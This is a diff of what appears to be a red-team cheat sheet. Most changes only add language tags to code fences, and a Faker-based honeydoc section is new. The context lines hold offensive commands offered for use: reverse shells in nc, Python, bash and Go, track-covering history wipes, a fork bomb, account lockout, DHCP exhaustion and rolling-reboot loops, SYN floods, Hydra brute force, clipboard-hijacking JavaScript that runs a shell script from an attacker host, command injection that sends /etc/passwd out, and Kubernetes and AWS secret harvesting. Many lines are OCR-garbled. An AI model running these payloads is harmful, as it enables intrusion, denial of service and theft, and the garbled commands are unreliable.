@@ -40,7 +40,7 @@ Share with your friends:
 
 # Linux System Enumeration / Post Exploitation
 
-```
+```bash
 id
 w
 who -a
@@ -57,7 +57,7 @@ cat /proc/version
 
 # Linux Miscellaneous Commands / Covering Tracks
 
-```
+```bash
 chattr (+/-)i file
 unset HISTFILE
 unset HISTFILESIZE
@@ -75,13 +75,13 @@ ln /dev/null -/.bash_historj -sf
 
 Linux: 
 
-```
+```bash
 :(){:I: &I;:
 ```
 
 Python: 
 
-```
+```python
 #!/usr/bin/env python
 
     import os
@@ -90,14 +90,14 @@ Python:
 
 # TCPDump
 
-```
+```bash
 tcpdump -i ethO -XX -w out.pcap
 tcpdump -i ethO port XX dst X.X.X.X
 ```
 
 # Windows System Enumeration
 
-```
+```powershell
 ver
 time
 net session
@@ -122,7 +122,7 @@ reg save HKLl~\Security security.hive echo %USERNAl~E%
 
 # Start RDP
 
-```
+```powershell
 reg add "HKEY LOCAL t1ACHINE\SYSTEH\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 (Tunnel RDP through port 443) REG ADD "HKLM\System\CurrentControlSet\Control\Terminal
 Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f
@@ -130,7 +130,7 @@ Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f
 
 # PowerShell Enumeration
 
-```
+```powershell
 Get-WmiObject -class win32 operatingsjstem I select -property 1 csv c:\os.txt
 Get-Service I where object {$ .status -eq ''Running''}
 (new-object sjstem.net.webclient) .downloadFile(''url'',''dest'')
@@ -148,21 +148,21 @@ powershell.exe Send-l-1ai1Hessage -to " email " -from " email " -subject "Subjec
 
 # Windows User Lockout
 
-```
+```batch
 @echo T est run:
 for /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\WIN- 1234\c$ /USER:%%U wrongpass
 ```
 
 # Windows DHCP Exhaustion
 
-```
+```powershell
 for /L %i in (2,1,254) do (netsh interface ip set address local static
 1.1.1.%i netrnask gw I~ %1 ping 12-.0.0.1 -n l -w 10000 nul %1)
 ```
 
 # Rolling Reboot
 
-```
+```powershell
 for /L %i in (2,1,254) do shutdown /r /m \\l.l.l.%i /f /t 0 /c "Reboot
 message''
 ```
@@ -191,7 +191,7 @@ http://ip/level/16-99/exec/show/config
 
 # FTP Through Non-Interactive Shell
 
-```
+```bash
 echo open ip 21 ftp.txt
 echo user
 echo pass
@@ -202,21 +202,21 @@ ftp -s:ftp.txt
 
 # NetCat Listeners
 
-```
+```bash
 nc 10.0.0.1 1234 -e /bin/sh Linux reverse shell 
 nc 10.0.0.1 1234 -e cmd.exe Windows reverse shell
 ```
 
 # Python Reverse Shell
 
-```
+```python
 python -c 'import socket,subprocess,os; s=socket.socket(socket..;;F_INET, socket.SOCK_STREAL1); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0); os.dup2(s.fileno(l,1); os.dup2(s.file:oo(),2);
 p~subprocess.call( 1"/bin/sh","-i"] I;'
 ```
 
 # Bash Reverse Shell
 
-```
+```bash
 bash -i & /dev/tcp/10.0.0.1/8080 0 &1
 ```
 
@@ -231,19 +231,19 @@ bash -i & /dev/tcp/10.0.0.1/8080 0 &1
 
 # HPING3 DoS
 
-```
+```bash
 hping3 targetiP --flood --frag --spoof ip --destport # --syn
 ```
 
 # Hydra Online Brute Force
 
-```
+```bash
 hydra -1 ftp -P words -v targetiP ftp
 ```
 
 # Download HTTP File and Execute
 
-```
+```python
 #!/usr/bin/python import urllib2, os
 urls = [11 1.1.1.1'',"2.2.2.2"] port = 11 80"
 payload = "cb.sh"
@@ -281,14 +281,14 @@ dict.txt ?a?a?a?a
 
 # Malicious Javascript
 
-```
+```javascript
 <script>
 document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\n'); e.preventDefault(); });
  </script>
  ```
 # Execute Fileless Scripts in Golang
 
-```
+```golang
 package main
 
 import (
@@ -315,7 +315,7 @@ func main() {
 ```
 # Golang Reverse Shell
 
-```
+```golang
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
 ```
 
@@ -389,7 +389,7 @@ A command-line tool to quickly analyze all IPs in a file and see which ones have
 
 ## Install:
 
-```
+```bash
 $ wget https://gitlab.com/api/v4/projects/33695681/packages/generic/nrich/latest/nrich_latest_amd64.deb
 $ sudo dpkg -i nrich_latest_amd64.deb
 ```
@@ -428,7 +428,7 @@ ARGS:
 
 Enumerate new Reddit comments for threat intelligence. This script can be modified with regular expressions to hone in on exploit development, modern threats, and any newsworthy cyber events. 
 
-```
+```python
 #!/usr/bin/env python3
 
 import praw
@@ -446,7 +446,7 @@ for comment in reddit.subreddit('hacking+infosec+redteamsec+cybersecurity+netsec
 
 # Enumerating Anonymous FTP Logins Using Python:
 
-```
+```python
 #!/usr/bin/python3
 
 from ftplib import FTP
@@ -475,8 +475,37 @@ for item in r:
 
 # Python Reverse Shell:
 
-```
+```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+## Generating HoneyDocs with Python:
+
+Python's Faker module can be utilized to create honeydocs of PII with malicious macros, wordlists, emails for login brute-forcing, and much more.
+
+```python
+import pandas as pd
+from faker import Faker
+
+# Create a Faker object
+fake = Faker()
+
+# Options to data:
+fake.name()
+fake.text()
+fake.address()
+fake.email()
+fake.date()
+fake.country()
+fake.phone_number()
+fake.random_number(digits=5)
+
+# Example DataFrame
+faker_df = pd.DataFrame({'date':[fake.date() for i in range(10)],
+                         'name':[fake.name() for i in range(10)],
+                         'email':[fake.email() for i in range(10)],
+                         'text':[fake.text() for i in range(10)]})
+faker_df
 ```
 
 # Cloud:
@@ -485,7 +514,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 Enumerate for Priv Esc:
 
-```
+```bash
 # Login
 $ az login -u <user> -p <password>
 
@@ -513,7 +542,7 @@ inurl:pastebin "AWS_ACCESS_KEY"
 
 Recursively searching for AWS Access Keys on *Nix containers
 
-```
+```bash
 $ grep -ER "AKIA[A-Z0-9]{16}|ASIA[A-Z0-9]{16}" /
 ```
 
@@ -525,7 +554,7 @@ s3 site:amazonaws.com filetype:log
 
 ## Kubernetes Secrets Harvesting:
 
-```
+```bash
 $ curl -k -v -H “Authorization: Bearer <jwt_token>” -H “Content-Type: application/json” https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r ‘.items[].data’
 ```
 
@@ -548,7 +577,7 @@ $(command )
 
 Ngrok for Command Injection:
 
-```
+```bash
 # Start listener
 $ ./ngrok http 80
 
@@ -561,7 +590,7 @@ Input field -> ;curl%20-F%20shl=@/etc/passwd%20blablabla.ngrok.io
 
 Useful Commands: Linux
 
-```
+```bash
 whoami
 ifconfig
 ls
@@ -570,7 +599,7 @@ uname -a
 
 Useful Commands: Windows
 
-```
+```powershell
 whoami
 ipconfig
 dir
@@ -588,21 +617,21 @@ ls %0A id
 ```
 
 Time Delay Commands
-```
+```bash
 & ping -c 10 127.0.0.1 &
 ```
 
 Redirecting Output
-```
+```bash
 & whoami > /var/www/images/output.txt &
 ```
 OOB (Out Of Band) Exploitation
-```
+```bash
 & nslookup attacker-server.com &
 & nslookup `whoami`.attacker-server.com &
 ```
 WAF Bypasses
-```
+```bash
 vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O 
 /tmp/reverse.php %0a php /tmp/reverse.php
 vuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>
@@ -664,7 +693,7 @@ X-True-IP: 127.0.0.1
 
 Python script for enumerating Wayback Machine internet archives for potential subdomains, sites, and files; specifically potential password and robots.txt files.
 
-```
+```python
 #!/usr/bin/env python3
 
 import requests
@@ -694,6 +723,6 @@ with open("/tmp/website_enum.txt", "r") as file:
 
 Or use this one-liner to screenshot web pages with EyeWitness!
 
-```
+```python
 root@RoseSecurity:~# python3 -c 'import requests; import os; url = str("https://web.archive.org/cdx/search/cdx?url=<website>/*&output=text&fl=original&collapse=urlkey"); url_request = requests.get(url); web_file = open("/tmp/website_enum.txt", "a"); web_file.write(url_request.text); web_file.close()'; eyewitness -f /tmp/website_enum.txt
 ```
